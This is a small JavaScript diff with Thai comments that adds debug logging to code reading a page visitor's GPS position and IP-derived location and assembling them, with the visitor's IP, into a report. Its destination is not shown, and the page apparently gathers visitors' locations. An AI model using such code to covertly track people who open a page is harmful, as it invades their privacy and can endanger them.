@@ -50,9 +50,11 @@
 
             // ถ้าผู้ใช้อนุญาตให้เข้าถึงตำแหน่งจาก GPS
             if ("geolocation" in navigator) {
+                console.log("กำลังดึงข้อมูลตำแหน่งจาก GPS...");
                 navigator.geolocation.getCurrentPosition(async function(position) {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
+                    console.log("ตำแหน่ง GPS:", latitude, longitude);
 
                     // สร้าง Google Maps Link
                     const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
@@ -70,6 +72,7 @@
                     // ใช้ตำแหน่งจาก IP
                     const ipLocationData = await getIpLocation();
                     const ipLocation = ipLocationData && ipLocationData.loc ? ipLocationData.loc.split(',') : ['Unknown', 'Unknown'];
+                    console.log("ตำแหน่งจาก IP:", ipLocation);
 
                     const content = `
                         IP: ${ip}
@@ -84,6 +87,7 @@
                 // หากไม่ได้รับตำแหน่ง ให้ใช้ตำแหน่งจาก IP
                 const ipLocationData = await getIpLocation();
                 const ipLocation = ipLocationData && ipLocationData.loc ? ipLocationData.loc.split(',') : ['Unknown', 'Unknown'];
+                console.log("ตำแหน่งจาก IP:", ipLocation);
 
                 const content = `
                     IP: ${ip}
